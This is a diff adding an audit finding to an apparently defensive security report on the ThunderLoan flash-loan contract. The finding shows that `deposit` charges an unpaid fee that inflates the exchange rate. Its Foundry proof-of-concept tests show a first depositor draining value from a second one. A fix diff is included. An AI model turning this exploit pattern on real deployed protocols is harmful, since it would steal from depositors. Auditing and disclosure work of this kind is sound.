@@ -106,6 +106,171 @@ A 10 token loan should cost `0.03` tokens in fees and the protocol charges `0.00
 
 2. If the fee is meant to be collected in WETH terms instead, then the repayment check, the event and the exchange rate update all have to be denominated in WETH too, and the natspec has to say which unit the fee is in.
 ___
+### [H-2] A plain deposit is charged a flash loan fee that was never paid in `ThunderLoan::deposit`, so the exchange rate inflates and the pool owes more than it holds
+
+**Description::**
+`deposit` charges the depositor a flash loan fee and adds it to the exchange rate, even though no loan was taken and no fee was paid:
+
+```javascript
+assetToken.mint(msg.sender, mintAmount);
+uint256 calculatedFee = getCalculatedFee(token, amount);
+assetToken.updateExchangeRate(calculatedFee);
+token.safeTransferFrom(msg.sender, address(assetToken), amount);
+```
+
+`updateExchangeRate` credits that fee to every existing holder by scaling the rate:
+
+```javascript
+uint256 newExchangeRate = (s_exchangeRate * (totalSupply() + fee)) / totalSupply();
+```
+
+On a flash loan that is correct, because the borrower actually pays the fee and the repayment check (`endingBalance < startingBalance + fee`) enforces it. On a deposit nobody pays anything, the only tokens that enter the pool are the depositor's own `amount`, and the rate still goes up, so the AssetToken ends up claiming underlying that does not exist. The block was copied from the flash loan path where the same two lines are legitimate.
+
+**Impact::**
+The exchange rate inflates on a plain deposit by the fee that was never paid, so the pool is immediately insolvent: in the PoC a `100e18` deposit mints `100e18` asset tokens and pushes the rate from `1e18` to `1.003e18`, which makes `100.3e18` underlying redeemable while only `100e18` is held. The value is credited to whoever holds asset tokens first, so the first depositor redeems more than they put in and the shortfall is taken from the next depositor: the first depositor puts in `100e18` and takes out `100.4506753369945082e18`, while the victim's `100e18` deposit is left with `99.5493246630054918e18` of underlying against a `100.150224663005491723e18` claim, and their own `redeem` reverts. Every deposit repeats the inflation, so the protocol can never become solvent again and the last liquidity provider out cannot withdraw. On a live protocol the first-in advantage can be sandwiched around any large deposit.
+
+**Proof of Concept::**
+Check the `test_DepositChargesItsOwnFee_AUDIT` and `test_DepositExchangeRateInflationStealsFromNextDepositor_AUDIT` tests in the `ThunderLoanTest.t.sol` file:
+<details>
+<summary>Here's the full code</summary>
+
+```javascript
+    // the H-2: deposit charges itself a flash loan fee that was never paid and adds it to the
+    // exchange rate, so a plain deposit with no loan in the transaction inflates the rate
+    function test_DepositChargesItsOwnFee_AUDIT() public setAllowedToken {
+        uint256 depositAmount = 100e18;
+        AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);
+
+        uint256 rateBefore = assetToken.getExchangeRate();
+
+        tokenA.mint(liquidityProvider, depositAmount);
+        vm.startPrank(liquidityProvider);
+        tokenA.approve(address(thunderLoan), depositAmount);
+        thunderLoan.deposit(tokenA, depositAmount);
+        vm.stopPrank();
+
+        uint256 rateAfter = assetToken.getExchangeRate();
+        uint256 minted = assetToken.totalSupply();
+        uint256 held = tokenA.balanceOf(address(assetToken));
+        uint256 redeemable = (minted * rateAfter) /
+            assetToken.EXCHANGE_RATE_PRECISION();
+
+        console2.log("exchange rate before:", rateBefore);
+        console2.log("exchange rate after a plain deposit:", rateAfter);
+        console2.log("asset tokens minted:", minted);
+        console2.log("underlying held by the pool:", held);
+        console2.log("underlying redeemable at the new rate:", redeemable);
+
+        // no flash loan happened, so the rate should never have moved
+        assertEq(rateBefore, 1e18);
+        assertGt(rateAfter, rateBefore);
+
+        // and the protocol already owes more underlying than it holds
+        assertGt(redeemable, held);
+    }
+
+    // the H-2 impact: the inflation is credited to whoever deposited first, so the first
+    // depositor redeems more than they put in and the next depositor cannot exit
+    function test_DepositExchangeRateInflationStealsFromNextDepositor_AUDIT()
+        public
+        setAllowedToken
+    {
+        uint256 depositAmount = 100e18;
+        AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);
+        address victim = makeAddr("victim");
+
+        // first depositor
+        tokenA.mint(liquidityProvider, depositAmount);
+        vm.startPrank(liquidityProvider);
+        tokenA.approve(address(thunderLoan), depositAmount);
+        thunderLoan.deposit(tokenA, depositAmount);
+        vm.stopPrank();
+
+        // an honest second depositor puts in the same amount
+        tokenA.mint(victim, depositAmount);
+        vm.startPrank(victim);
+        tokenA.approve(address(thunderLoan), depositAmount);
+        thunderLoan.deposit(tokenA, depositAmount);
+        vm.stopPrank();
+
+        uint256 victimAssetTokens = assetToken.balanceOf(victim);
+        uint256 rate = assetToken.getExchangeRate();
+        uint256 victimRedeemable = (victimAssetTokens * rate) /
+            assetToken.EXCHANGE_RATE_PRECISION();
+
+        // the first depositor exits with everything
+        // (read the balance first, a call inside the args would eat the prank)
+        uint256 firstDepositorAssetTokens = assetToken.balanceOf(
+            liquidityProvider
+        );
+        vm.prank(liquidityProvider);
+        thunderLoan.redeem(tokenA, firstDepositorAssetTokens);
+
+        uint256 firstDepositorOut = tokenA.balanceOf(liquidityProvider);
+        uint256 leftForVictim = tokenA.balanceOf(address(assetToken));
+
+        console2.log("first depositor put in:", depositAmount);
+        console2.log("first depositor took out:", firstDepositorOut);
+        console2.log(
+            "first depositor profit:",
+            firstDepositorOut - depositAmount
+        );
+        console2.log("victim asset tokens:", victimAssetTokens);
+        console2.log("victim redeemable at the rate:", victimRedeemable);
+        console2.log("underlying left for the victim:", leftForVictim);
+
+        // the first depositor made a profit with no risk
+        assertGt(firstDepositorOut, depositAmount);
+
+        // the victim cannot redeem what the exchange rate promises them
+        assertLt(leftForVictim, victimRedeemable);
+
+        // their own redeem reverts, the deposit is stuck behind the inflated rate
+        vm.prank(victim);
+        vm.expectRevert();
+        thunderLoan.redeem(tokenA, type(uint256).max);
+    }
+```
+
+</details>
+You can run it via
+
+```bash
+forge test --mt test_Deposit -vv
+```
+and you will see something like this:
+
+```text
+Logs:
+  exchange rate before: 1000000000000000000
+  exchange rate after a plain deposit: 1003000000000000000
+  asset tokens minted: 100000000000000000000
+  underlying held by the pool: 100000000000000000000
+  underlying redeemable at the new rate: 100300000000000000000
+Logs:
+  first depositor put in: 100000000000000000000
+  first depositor took out: 100450675336994508200
+  first depositor profit: 450675336994508200
+  victim asset tokens: 99700897308075772681
+  victim redeemable at the rate: 100150224663005491723
+  underlying left for the victim: 99549324663005491800
+```
+A deposit with no loan anywhere moves the rate from `1e18` to `1.003e18` and leaves `100.3e18` redeemable against the `100e18` that is actually held, so the pool is insolvent after the very first deposit. In the second test the first depositor walks away with `0.45e18` of profit and the next depositor's `redeem` reverts.
+
+**Recommended Solution::**
+1. Remove the fee accounting from `deposit`. The fee is only ever paid on a flash loan, so the deposit path must not touch the exchange rate:
+
+```diff
+         assetToken.mint(msg.sender, mintAmount);
+-        uint256 calculatedFee = getCalculatedFee(token, amount);
+-        assetToken.updateExchangeRate(calculatedFee);
+         token.safeTransferFrom(msg.sender, address(assetToken), amount);
+```
+
+2. Keep the `updateExchangeRate` call on the flash loan path, where the repayment check guarantees the fee was actually received. The rate should only move when the protocol has the tokens to back it.
+
+3. Both PoCs have to be flipped after the fix: the rate must stay at `1e18` on a deposit and the first depositor must stop profiting, so the `assertGt` calls become `assertEq` on those values.
+___
 ### [L-1] Unprotected initializer in `ThunderLoan::initialize`, the proxy can be initialized by anyone and the deploy script never calls it
 
 **Description::**
